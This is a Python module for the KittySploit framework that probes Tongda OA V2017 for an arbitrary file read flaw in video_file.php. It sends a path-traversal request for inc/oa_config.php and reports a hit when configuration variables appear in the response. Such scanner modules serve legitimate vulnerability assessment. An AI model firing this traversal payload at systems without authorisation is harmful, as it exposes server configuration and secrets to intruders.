#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""There is an arbitrary file reading vulnerability in Extreme OA video_file."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Tongda OA V2017 Video File - Arbitrary File Read Detection',
        'description': 'There is an arbitrary file reading vulnerability in Extreme OA video_file.php. An attacker can obtain sensitive files on the server through the vulnerability.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'vulnerability', 'tongda', 'lfi', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': ['http://wiki.peiqi.tech/wiki/oa/通达OA/通达OA%20v2017%20video_file.php%20任意文件下载漏洞.html'],
    }

    def run(self):
        r = self.http_request(method="GET", path='/general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('$ROOT_PATH', '$ATTACH_PATH',)
        if (any(m in body for m in body_any)):
            self.set_info(
                severity='medium',
                reason="Tongda OA V2017 Video File - Arbitrary File Read detected",
                path='/general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php',
            )
            return True
        return False

